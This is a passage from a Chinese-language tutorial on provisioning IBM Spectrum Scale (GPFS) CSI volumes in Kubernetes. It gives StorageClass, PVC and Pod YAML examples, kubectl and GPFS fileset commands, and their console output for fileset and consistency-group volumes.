<span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">mypvc</span><br>         <span class="hljs-attr">mountPath:</span> <span class="hljs-string">/usr/share/nginx/html/scale</span><br>     <span class="hljs-attr">ports:</span><br>     <span class="hljs-bullet">-</span> <span class="hljs-attr">containerPort:</span> <span class="hljs-number">80</span><br>  <span class="hljs-attr">volumes:</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">mypvc</span><br>     <span class="hljs-attr">persistentVolumeClaim:</span><br>       <span class="hljs-attr">claimName:</span> <span class="hljs-string">scale-lt-pvc</span><br>       <span class="hljs-attr">readOnly:</span> <span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 应用 pod 配置</span><br>kubectl apply -f podlw.yaml<br><br><span class="hljs-comment"># 查看 pod 状态</span><br>kubectl get storageclass,pvc,pod -n default<br></code></pre></td></tr></table></figure><p><strong>相关输出记录:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[bugwz@node03 lw]$ kubectl get storageclass,pvc,pod -n default<br>NAME                                                    PROVISIONER                 RECLAIMPOLICY   VOLUMEBINDINGMODE   ALLOWVOLUMEEXPANSION   AGE<br>storageclass.storage.k8s.io/ibm-spectrum-scale-csi-lt   spectrumscale.csi.ibm.com   Delete          Immediate           <span class="hljs-literal">false</span>                  19m<br>storageclass.storage.k8s.io/standard (default)          k8s.io/minikube-hostpath    Delete          Immediate           <span class="hljs-literal">false</span>                  13h<br><br>NAME                                   STATUS   VOLUME                                     CAPACITY   ACCESS MODES   STORAGECLASS                VOLUMEATTRIBUTESCLASS   AGE<br>persistentvolumeclaim/scale-lt-pvc     Bound    pvc-9e61d403-2005-48f7-960f-ddddac18b2c8   1Gi        RWX            ibm-spectrum-scale-csi-lt   &lt;<span class="hljs-built_in">unset</span>&gt;                 3m28s<br><br>NAME                           READY   STATUS    RESTARTS   AGE<br>pod/csi-scale-ltwtdemo-pod     1/1     Running   0          22s<br></code></pre></td></tr></table></figure><h3 id="5-2-2、文件集卷-独立"><a href="#5-2-2、文件集卷-独立" class="headerlink" title="5.2.2、文件集卷(独立)"></a>5.2.2、文件集卷(独立)</h3><p>独立文件集卷（Fileset-based(Independent) Volumes）。在 GPFS 文件系统中，文件集是文件系统命名空间的子树，在许多方面其行为类似于一个独立的文件系统。文件集允许用户对文件系统进行分区，从而能够以比整个文件系统更细粒度的粒度执行管理操作。参考 <a href="https://www.ibm.com/docs/en/scalecsi/2.11.0?topic=class-storage-creating-fileset-based-volumes">IBM Doc: Creating Fileset Volumes</a> 。</p><h4 id="5-2-2-1、创建StorageClass"><a href="#5-2-2-1、创建StorageClass" class="headerlink" title="5.2.2.1、创建StorageClass"></a>5.2.2.1、创建StorageClass</h4><p><strong>storageclassfileset.yaml 配置:</strong>  (参考 <a href="https://github.com/IBM/ibm-spectrum-scale-csi/blob/v2.11.1/driver/examples/version1/volume/dynamicprovisioning/fileset/independent/storageclassfileset.yaml">storageclassfileset.yaml</a>)</p><figure class="highlight yaml"><table><tr><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">storage.k8s.io/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">StorageClass</span><br><span class="hljs-attr">metadata:</span><br>   <span class="hljs-attr">name:</span> <span class="hljs-string">ibm-spectrum-scale-csi-fileset</span><br><span class="hljs-attr">provisioner:</span> <span class="hljs-string">spectrumscale.csi.ibm.com</span><br><span class="hljs-attr">parameters:</span><br>    <span class="hljs-attr">volBackendFs:</span> <span class="hljs-string">&quot;defaultfs&quot;</span><br>    <span class="hljs-attr">shared:</span> <span class="hljs-string">&quot;true&quot;</span><br><span class="hljs-attr">reclaimPolicy:</span> <span class="hljs-string">Delete</span><br></code></pre></td></tr></table></figure><p><strong>关键字段解释:</strong></p><ul><li><code>volBackendFs</code> : 对应 GPFS 文件系统名称。</li><li><code>shared</code> : 如果您的 Pod 中包含非 root 用户，并且他们使用具有 ReadWriteMany (RWX) 访问模式的 PVC ，请设置该参数为 true 。 默认值为 false 。</li></ul><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 应用 storageclass 配置</span><br>kubectl apply -f storageclassfileset.yaml<br><br><span class="hljs-comment"># 查看 storageclass 状态</span><br>kubectl get storageclass -n default<br></code></pre></td></tr></table></figure><p><strong>相关输出记录:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[bugwz@node03 dynamic]$ kubectl apply -f storageclasslw.yaml<br>storageclass.storage.k8s.io/ibm-spectrum-scale-csi-fileset created<br><br><br>[bugwz@node03 dynamic]$ kubectl get storageclass -n default<br>NAME                             PROVISIONER                 RECLAIMPOLICY   VOLUMEBINDINGMODE   ALLOWVOLUMEEXPANSION   AGE<br>ibm-spectrum-scale-csi-fileset   spectrumscale.csi.ibm.com   Delete          Immediate           <span class="hljs-literal">false</span>                  7s<br>standard (default)               k8s.io/minikube-hostpath    Delete          Immediate           <span class="hljs-literal">false</span>                  13h<br></code></pre></td></tr></table></figure><h4 id="5-2-2-2、创建PVC"><a href="#5-2-2-2、创建PVC" class="headerlink" title="5.2.2.2、创建PVC"></a>5.2.2.2、创建PVC</h4><p>使用此 storageClass 创建持久卷声明 (PVC)，如以下示例所示： 根据您的要求修改相关参数。</p><p><strong>pvcfileset.yaml 配置:</strong>  (参考 <a href="https://github.com/IBM/ibm-spectrum-scale-csi/blob/v2.11.1/driver/examples/version1/volume/dynamicprovisioning/fileset/independent/pvcfileset.yaml">pvcfileset.yaml</a>)</p><figure class="highlight yaml"><table><tr><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">PersistentVolumeClaim</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">scale-fset-pvc</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">accessModes:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">ReadWriteMany</span><br>  <span class="hljs-attr">resources:</span><br>    <span class="hljs-attr">requests:</span><br>      <span class="hljs-attr">storage:</span> <span class="hljs-string">1Gi</span><br>  <span class="hljs-attr">storageClassName:</span> <span class="hljs-string">ibm-spectrum-scale-csi-fileset</span><br></code></pre></td></tr></table></figure><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 应用 pvc 配置</span><br>kubectl apply -f pvcfileset.yaml<br><br><span class="hljs-comment"># 查看 pvc 状态</span><br>kubectl get storageclass,pvc -n default<br><br><span class="hljs-comment"># 查看 GPFS 数据目录信息</span><br><span class="hljs-built_in">ls</span> -al /gpfsdata/<br><span class="hljs-built_in">sudo</span> tree /gpfsdata/<br></code></pre></td></tr></table></figure><p><strong>相关输出记录:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[bugwz@node03 lw]$ kubectl get storageclass,pvc -n default<br>NAME                                                         PROVISIONER                 RECLAIMPOLICY   VOLUMEBINDINGMODE   ALLOWVOLUMEEXPANSION   AGE<br>storageclass.storage.k8s.io/ibm-spectrum-scale-csi-fileset   spectrumscale.csi.ibm.com   Delete          Immediate           <span class="hljs-literal">false</span>                  5m47s<br>storageclass.storage.k8s.io/standard (default)               k8s.io/minikube-hostpath    Delete          Immediate           <span class="hljs-literal">false</span>                  13h<br><br>NAME                                   STATUS   VOLUME                                     CAPACITY   ACCESS MODES   STORAGECLASS                     VOLUMEATTRIBUTESCLASS   AGE<br>persistentvolumeclaim/scale-fset-pvc   Bound    pvc-d100b2f5-f1e9-4812-946f-437e586da8a5   1Gi        RWX            ibm-spectrum-scale-csi-fileset   &lt;<span class="hljs-built_in">unset</span>&gt;                 2m57s<br><br>[bugwz@node03 fileset]$ <span class="hljs-built_in">ls</span> -al /gpfsdata/<br>total 2<br>drwxrwx--x 3 root root 4096 Jul  3 11:14 pvc-d100b2f5-f1e9-4812-946f-437e586da8a5<br>drwxrwx--x 3 root root 4096 Jul  1 14:33 spectrum-scale-csi-volume-store<br><br><br>[bugwz@node03 fileset]$ <span class="hljs-built_in">sudo</span> tree /gpfsdata/pvc-d100b2f5-f1e9-4812-946f-437e586da8a5<br>/gpfsdata/pvc-d100b2f5-f1e9-4812-946f-437e586da8a5<br>└── pvc-d100b2f5-f1e9-4812-946f-437e586da8a5-data<br><br>1 directory, 0 files<br></code></pre></td></tr></table></figure><h4 id="5-2-2-3、创建Pod"><a href="#5-2-2-3、创建Pod" class="headerlink" title="5.2.2.3、创建Pod"></a>5.2.2.3、创建Pod</h4><p>对应以上配置修改下面的信息。</p><p><strong>podfileset.yaml 配置:</strong>  (参考 <a href="https://github.com/IBM/ibm-spectrum-scale-csi/blob/v2.11.1/driver/examples/version1/volume/dynamicprovisioning/fileset/independent/podfileset.yaml">podfileset.yaml</a>)</p><figure class="highlight yaml"><table><tr><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Pod</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">csi-scale-fsetdemo-pod</span><br>  <span class="hljs-attr">labels:</span><br>    <span class="hljs-attr">app:</span> <span class="hljs-string">nginx</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">containers:</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">web-server</span><br>     <span class="hljs-attr">image:</span> <span class="hljs-string">nginx</span> <br>     <span class="hljs-attr">volumeMounts:</span><br>       <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">mypvc</span><br>         <span class="hljs-attr">mountPath:</span> <span class="hljs-string">/usr/share/nginx/html/scale</span><br>     <span class="hljs-attr">ports:</span><br>     <span class="hljs-bullet">-</span> <span class="hljs-attr">containerPort:</span> <span class="hljs-number">80</span><br>  <span class="hljs-attr">volumes:</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">mypvc</span><br>     <span class="hljs-attr">persistentVolumeClaim:</span><br>       <span class="hljs-attr">claimName:</span> <span class="hljs-string">scale-fset-pvc</span><br>       <span class="hljs-attr">readOnly:</span> <span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 应用 pod 配置</span><br>kubectl apply -f podfileset.yaml<br><br><span class="hljs-comment"># 查看 pod 状态</span><br>kubectl get storageclass,pvc,pod -n default<br></code></pre></td></tr></table></figure><p><strong>相关输出记录:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[bugwz@node03 fileset]$ kubectl get storageclass,pvc,pod -n default<br>NAME                                                         PROVISIONER                 RECLAIMPOLICY   VOLUMEBINDINGMODE   ALLOWVOLUMEEXPANSION   AGE<br>storageclass.storage.k8s.io/ibm-spectrum-scale-csi-fileset   spectrumscale.csi.ibm.com   Delete          Immediate           <span class="hljs-literal">false</span>                  10m<br>storageclass.storage.k8s.io/standard (default)               k8s.io/minikube-hostpath    Delete          Immediate           <span class="hljs-literal">false</span>                  13h<br><br>NAME                                   STATUS   VOLUME                                     CAPACITY   ACCESS MODES   STORAGECLASS                     VOLUMEATTRIBUTESCLASS   AGE<br>persistentvolumeclaim/scale-fset-pvc   Bound    pvc-d100b2f5-f1e9-4812-946f-437e586da8a5   1Gi        RWX            ibm-spectrum-scale-csi-fileset   &lt;<span class="hljs-built_in">unset</span>&gt;                 8m6s<br><br>NAME                           READY   STATUS    RESTARTS   AGE<br>pod/csi-scale-fsetdemo-pod     1/1     Running   0          12s<br></code></pre></td></tr></table></figure><h3 id="5-2-3、文件集卷-依赖"><a href="#5-2-3、文件集卷-依赖" class="headerlink" title="5.2.3、文件集卷(依赖)"></a>5.2.3、文件集卷(依赖)</h3><p>依赖文件集卷（Fileset-based(Dependent) Volumes）。</p><h4 id="5-2-3-1、创建StorageClass"><a href="#5-2-3-1、创建StorageClass" class="headerlink" title="5.2.3.1、创建StorageClass"></a>5.2.3.1、创建StorageClass</h4><p>在配置 StorageClass 之前，我们可以在 GPFS Server 节点创建一个独立的 Fileset ，作为下面的 Parent Fileset 使用。</p><blockquote><p><strong>注意:</strong> 在创建 Fileset-based(Dependent) Volumes 的时候，其 Parent Fileset 必须是一个独立的 Fileset 。</p></blockquote><p><strong>前置操作:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 创建一个 quota 为 10GB 的独立的 fileset</span><br>mmcrfileset defaultfs fileset-independent --inode-space new<br>mmsetquota defaultfs:fileset-independent --block 10737418240:10737418240<br>mmlinkfileset defaultfs fileset-independent -J /gpfsdata/fileset-independent<br></code></pre></td></tr></table></figure><p><strong>storageclassfilesetdependent.yaml 配置:</strong>  (参考 <a href="https://github.com/IBM/ibm-spectrum-scale-csi/blob/v2.11.1/driver/examples/version1/volume/dynamicprovisioning/fileset/dependent/storageclassfileset.yaml">storageclassfileset.yaml</a>)</p><figure class="highlight yaml"><table><tr><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">storage.k8s.io/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">StorageClass</span><br><span class="hljs-attr">metadata:</span><br>   <span class="hljs-attr">name:</span> <span class="hljs-string">ibm-spectrum-scale-csi-fileset-dependent</span><br><span class="hljs-attr">provisioner:</span> <span class="hljs-string">spectrumscale.csi.ibm.com</span><br><span class="hljs-attr">parameters:</span><br>    <span class="hljs-attr">volBackendFs:</span> <span class="hljs-string">&quot;defaultfs&quot;</span><br>    <span class="hljs-attr">filesetType:</span> <span class="hljs-string">&quot;dependent&quot;</span><br>    <span class="hljs-attr">parentFileset:</span> <span class="hljs-string">&quot;fileset-independent&quot;</span><br>    <span class="hljs-attr">shared:</span> <span class="hljs-string">&quot;true&quot;</span><br><span class="hljs-attr">reclaimPolicy:</span> <span class="hljs-string">Delete</span><br></code></pre></td></tr></table></figure><p><strong>关键字段解释:</strong></p><ul><li><code>volBackendFs</code> : 对应 GPFS 文件系统名称。</li><li><code>filesetType</code> : 文件集类型，有效选项为 independent&#x2F;dependent ，默认值为 independent 。</li><li><code>parentFileset</code> : 父文件集名称。 仅 filesetType 为 dependent 时有效。默认值为 root 。</li><li><code>shared</code> : 如果您的 Pod 中包含非 root 用户，并且他们使用具有 ReadWriteMany (RWX) 访问模式的 PVC ，请设置该参数为 true 。 默认值为 false 。</li></ul><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 应用 storageclass 配置</span><br>kubectl apply -f storageclassfilesetdependent.yaml<br><br><span class="hljs-comment"># 查看 storageclass 状态</span><br>kubectl get storageclass -n default<br></code></pre></td></tr></table></figure><p><strong>相关输出记录:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[bugwz@node03 dynamic]$ kubectl apply -f storageclasslw.yaml<br>storageclass.storage.k8s.io/ibm-spectrum-scale-csi-fileset-dependent created<br><br><br>[bugwz@node03 dynamic]$ kubectl get storageclass -n default<br>NAME                                       PROVISIONER                 RECLAIMPOLICY   VOLUMEBINDINGMODE   ALLOWVOLUMEEXPANSION   AGE<br>ibm-spectrum-scale-csi-fileset-dependent   spectrumscale.csi.ibm.com   Delete          Immediate           <span class="hljs-literal">false</span>                  18s<br>standard (default)                         k8s.io/minikube-hostpath    Delete          Immediate           <span class="hljs-literal">false</span>                  14h<br></code></pre></td></tr></table></figure><h4 id="5-2-3-2、创建PVC"><a href="#5-2-3-2、创建PVC" class="headerlink" title="5.2.3.2、创建PVC"></a>5.2.3.2、创建PVC</h4><p>使用此 storageClass 创建持久卷声明 (PVC)，如以下示例所示： 根据您的要求修改相关参数。</p><p><strong>pvcfilesetdependent.yaml 配置:</strong>  (参考 <a href="https://github.com/IBM/ibm-spectrum-scale-csi/blob/v2.11.1/driver/examples/version1/volume/dynamicprovisioning/fileset/dependent/pvcfileset.yaml">pvcfileset.yaml</a>)</p><figure class="highlight yaml"><table><tr><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">PersistentVolumeClaim</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">scale-fset-pvc-dependent</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">accessModes:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">ReadWriteMany</span><br>  <span class="hljs-attr">resources:</span><br>    <span class="hljs-attr">requests:</span><br>      <span class="hljs-attr">storage:</span> <span class="hljs-string">1Gi</span><br>  <span class="hljs-attr">storageClassName:</span> <span class="hljs-string">ibm-spectrum-scale-csi-fileset-dependent</span><br></code></pre></td></tr></table></figure><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 应用 pvc 配置</span><br>kubectl apply -f pvcfilesetdependent.yaml<br><br><span class="hljs-comment"># 查看 pvc 状态</span><br>kubectl get storageclass,pvc -n default<br><br><span class="hljs-comment"># 查看 GPFS 数据目录信息</span><br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">ls</span> -al /gpfsdata/fileset-independent<br><span class="hljs-built_in">sudo</span> tree /gpfsdata/fileset-independent<br></code></pre></td></tr></table></figure><p><strong>相关输出记录:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[bugwz@node03 fileset]$ kubectl get storageclass,pvc -n default<br>NAME                                                                   PROVISIONER                 RECLAIMPOLICY   VOLUMEBINDINGMODE   ALLOWVOLUMEEXPANSION   AGE<br>storageclass.storage.k8s.io/ibm-spectrum-scale-csi-fileset-dependent   spectrumscale.csi.ibm.com   Delete          Immediate           <span class="hljs-literal">false</span>                  66s<br>storageclass.storage.k8s.io/standard (default)                         k8s.io/minikube-hostpath    Delete          Immediate           <span class="hljs-literal">false</span>                  14h<br><br>NAME                                             STATUS   VOLUME                                     CAPACITY   ACCESS MODES   STORAGECLASS                               VOLUMEATTRIBUTESCLASS   AGE<br>persistentvolumeclaim/scale-fset-pvc-dependent   Bound    pvc-147f3484-b0ec-4258-93b2-403ce0a6f8eb   1Gi        RWX            ibm-spectrum-scale-csi-fileset-dependent   &lt;<span class="hljs-built_in">unset</span>&gt;                 49s<br>persistentvolumeclaim/scale-lt-pvc               Bound    pvc-9e61d403-2005-48f7-960f-ddddac18b2c8   1Gi        RWX            ibm-spectrum-scale-csi-lt                  &lt;<span class="hljs-built_in">unset</span>&gt;                 58m<br><br><br>[bugwz@node03 fileset]$ <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">ls</span> -al /gpfsdata/fileset-independent<br>total 515<br>drwx------ 3 root root   4096 Jul  3 12:00 .<br>drwxr-xr-x 8 root root 262144 Jul  3 11:59 ..<br>drwxrwx--x 3 root root   4096 Jul  3 12:00 pvc-147f3484-b0ec-4258-93b2-403ce0a6f8eb<br>dr-xr-xr-x 2 root root   8192 Jan  1  1970 .snapshots<br><br><br>[bugwz@node03 fileset]$ <span class="hljs-built_in">sudo</span> tree /gpfsdata/fileset-independent<br>/gpfsdata/fileset-independent<br>└── pvc-147f3484-b0ec-4258-93b2-403ce0a6f8eb<br>    └── pvc-147f3484-b0ec-4258-93b2-403ce0a6f8eb-data<br><br>2 directories, 0 files<br></code></pre></td></tr></table></figure><h4 id="5-2-3-3、创建Pod"><a href="#5-2-3-3、创建Pod" class="headerlink" title="5.2.3.3、创建Pod"></a>5.2.3.3、创建Pod</h4><p>对应以上配置修改下面的信息。</p><p><strong>podfilesetdependent.yaml 配置:</strong>  (参考 <a href="https://github.com/IBM/ibm-spectrum-scale-csi/blob/v2.11.1/driver/examples/version1/volume/dynamicprovisioning/fileset/dependent/podfileset.yaml">podfileset.yaml</a>)</p><figure class="highlight yaml"><table><tr><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Pod</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">csi-scale-fsetdemo-pod-dependent</span><br>  <span class="hljs-attr">labels:</span><br>    <span class="hljs-attr">app:</span> <span class="hljs-string">nginx</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">containers:</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">web-server</span><br>     <span class="hljs-attr">image:</span> <span class="hljs-string">nginx</span> <br>     <span class="hljs-attr">volumeMounts:</span><br>       <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">mypvc</span><br>         <span class="hljs-attr">mountPath:</span> <span class="hljs-string">/usr/share/nginx/html/scale</span><br>     <span class="hljs-attr">ports:</span><br>     <span class="hljs-bullet">-</span> <span class="hljs-attr">containerPort:</span> <span class="hljs-number">80</span><br>  <span class="hljs-attr">volumes:</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">mypvc</span><br>     <span class="hljs-attr">persistentVolumeClaim:</span><br>       <span class="hljs-attr">claimName:</span> <span class="hljs-string">scale-fset-pvc-dependent</span><br>       <span class="hljs-attr">readOnly:</span> <span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 应用 pod 配置</span><br>kubectl apply -f podfilesetdependent.yaml<br><br><span class="hljs-comment"># 查看 pod 状态</span><br>kubectl get storageclass,pvc,pod -n default<br></code></pre></td></tr></table></figure><p><strong>相关输出记录:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[bugwz@node03 fileset]$ kubectl get storageclass,pvc,pod -n default<br>NAME                                                                   PROVISIONER                 RECLAIMPOLICY   VOLUMEBINDINGMODE   ALLOWVOLUMEEXPANSION   AGE<br>storageclass.storage.k8s.io/ibm-spectrum-scale-csi-fileset-dependent   spectrumscale.csi.ibm.com   Delete          Immediate           <span class="hljs-literal">false</span>                  5m56s<br>storageclass.storage.k8s.io/standard (default)                         k8s.io/minikube-hostpath    Delete          Immediate           <span class="hljs-literal">false</span>                  14h<br><br>NAME                                             STATUS   VOLUME                                     CAPACITY   ACCESS MODES   STORAGECLASS                               VOLUMEATTRIBUTESCLASS   AGE<br>persistentvolumeclaim/scale-fset-pvc-dependent   Bound    pvc-147f3484-b0ec-4258-93b2-403ce0a6f8eb   1Gi        RWX            ibm-spectrum-scale-csi-fileset-dependent   &lt;<span class="hljs-built_in">unset</span>&gt;                 5m39s<br><br>NAME                                   READY   STATUS    RESTARTS   AGE<br>pod/csi-scale-fsetdemo-pod-dependent   1/1     Running   0          12s<br></code></pre></td></tr></table></figure><h3 id="5-2-4、一致性组卷"><a href="#5-2-4、一致性组卷" class="headerlink" title="5.2.4、一致性组卷"></a>5.2.4、一致性组卷</h3><p>一致性组卷（Consistency Group Volumes）。在主集群所拥有的文件系统或主集群以外的其他集群所拥有的文件系统上的一致性组中创建 PVC 。 关于 Consistency Group 的相关资料: <a href="https://www.ibm.com/docs/en/scalecsi/2.11.0?topic=driver-consistency-group-cg">IBM Doc: Consistency Group</a>  ， <a href="https://www.ibm.com/docs/en/scalecsi/2.11.0?topic=class-storage-creating-consistency-group-volumes">IBM Doc: Creating Consistency Group Volumes</a> 。</p><p><strong>注意:</strong> </p><ul><li>要使用一致性组功能，您必须使用 GPFS(IBM Storage Scale) 5.1.3.0 或更高版本。</li><li>由于本文的测试环境中没有条件部署多集群，所以该模块功能未作验证，需读者自行操作验证。</li></ul><h4 id="5-2-4-1、创建StorageClass"><a href="#5-2-4-1、创建StorageClass" class="headerlink" title="5.2.4.1、创建StorageClass"></a>5.2.4.1、创建StorageClass</h4><p><strong>storageclassconsistencygroup.yaml 配置:</strong>  (参考 <a href="https://github.com/IBM/ibm-spectrum-scale-csi/blob/v2.11.1/driver/examples/version2/volume/storageclass.yaml">storageclass.yaml</a>)</p><figure class="highlight yaml"><table><tr><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">storage.k8s.io/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">StorageClass</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">ibm-spectrum-scale-csi-consistency-group</span><br><span class="hljs-attr">provisioner:</span> <span class="hljs-string">spectrumscale.csi.ibm.com</span><br><span class="hljs-attr">parameters:</span><br>    <span class="hljs-attr">version:</span> <span class="hljs-string">&quot;2&quot;</span><br>    <span class="hljs-attr">volBackendFs:</span> <span class="hljs-string">&quot;remotefs&quot;</span><br><span class="hljs-attr">reclaimPolicy:</span> <span class="hljs-string">Delete</span><br><span class="hljs-attr">allowVolumeExpansion:</span> <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p><strong>关键字段解释:</strong></p><ul><li><code>version</code> : 表示存储类的版本。 1 表示该存储类不用于一致性组， 2  表示存储类用于一致性组。</li><li><code>volBackendFs</code> : 对应 GPFS 文件系统名称。文件系统名称是主集群上远程挂载的文件系统的名称。</li></ul><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 应用 storageclass 配置</span><br>kubectl apply -f storageclassconsistencygroup.yaml<br><br><span class="hljs-comment"># 查看 storageclass 状态</span><br>kubectl get storageclass -n default<br></code></pre></td></tr></table></figure><h4 id="5-2-4-2、创建PVC"><a href="#5-2-4-2、创建PVC" class="headerlink" title="5.2.4.2、创建PVC"></a>5.2.4.2、创建PVC</h4><p>使用此 storageClass 创建持久卷声明 (PVC)，如以下示例所示： 根据您的要求修改相关参数。</p><p><strong>pvcconsistencygroup.yaml 配置:</strong>  (参考 <a href="https://github.com/IBM/ibm-spectrum-scale-csi/blob/v2.11.1/driver/examples/version2/volume/pvc.yaml">pvc.yaml</a>)</p><figure class="highlight yaml"><table><tr><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">PersistentVolumeClaim</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">scale-consistency-group-pvc</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">accessModes:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">ReadWriteMany</span><br>  <span class="hljs-attr">resources:</span><br>    <span class="hljs-attr">requests:</span><br>      <span class="hljs-attr">storage:</span> <span class="hljs-string">1Gi</span><br>  <span class="hljs-attr">storageClassName:</span> <span class="hljs-string">ibm-spectrum-scale-csi-consistency-group</span><br></code></pre></td></tr></table></figure><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 应用 pvc 配置</span><br>kubectl apply -f pvcconsistencygroup.yaml<br><br><span class="hljs-comment"># 查看 pvc 状态</span><br>kubectl get storageclass,pvc -n default<br></code></pre></td></tr></table></figure><h4 id="5-2-4-3、创建Pod"><a href="#5-2-4-3、创建Pod" class="headerlink" title="5.2.4.3、创建Pod"></a>5.2.4.3、创建Pod</h4><p>对应以上配置修改下面的信息。</p><p><strong>podconsistencygroup.yaml 配置:</strong>  (参考 <a href="https://github.com/IBM/ibm-spectrum-scale-csi/blob/v2.11.1/driver/examples/version2/volume/pod.yaml">pod.yaml</a>)</p><figure class="highlight yaml"><table><tr><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Pod</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">csi-scale-consistency-group-pod</span><br>  <span class="hljs-attr">labels:</span><br>    <span class="hljs-attr">app:</span> <span class="hljs-string">nginx</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">containers:</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">web-server</span><br>     <span class="hljs-attr">image:</span> <span class="hljs-string">nginx</span> <br>     <span class="hljs-attr">volumeMounts:</span><br>       <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">mypvc</span><br>         <span class="hljs-attr">mountPath:</span> <span class="hljs-string">/usr/share/nginx/html/scale</span><br>     <span class="hljs-attr">ports:</span><br>     <span class="hljs-bullet">-</span> <span class="hljs-attr">containerPort:</span> <span class="hljs-number">80</span><br>  <span class="hljs-attr">volumes:</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">mypvc</span><br>     <span class="hljs-attr">persistentVolumeClaim:</span><br>       <span class="hljs-attr">claimName:</span> <span class="hljs-string">scale-consistency-group-pvc</span><br>       <span class="hljs-attr">readOnly:</span> <span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 应用 pod 配置</span><br>kubectl apply -f podconsistencygroup.yaml<br><br><span 